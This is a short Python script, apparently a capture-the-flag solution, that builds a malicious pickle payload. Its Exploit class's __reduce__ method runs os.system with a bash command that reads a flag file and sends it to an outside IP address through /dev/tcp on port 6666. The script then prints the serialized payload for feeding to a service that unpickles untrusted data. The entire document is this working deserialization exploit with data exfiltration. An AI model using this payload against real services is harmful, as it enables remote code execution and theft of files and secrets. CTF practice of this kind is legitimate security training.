import os
import pickle
import sys

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "cat th1s_i5_y0ur_fl4g > /dev/tcp/140.112.196.228/6666"',))

shellcode = pickle.dumps(Exploit())
print(shellcode)

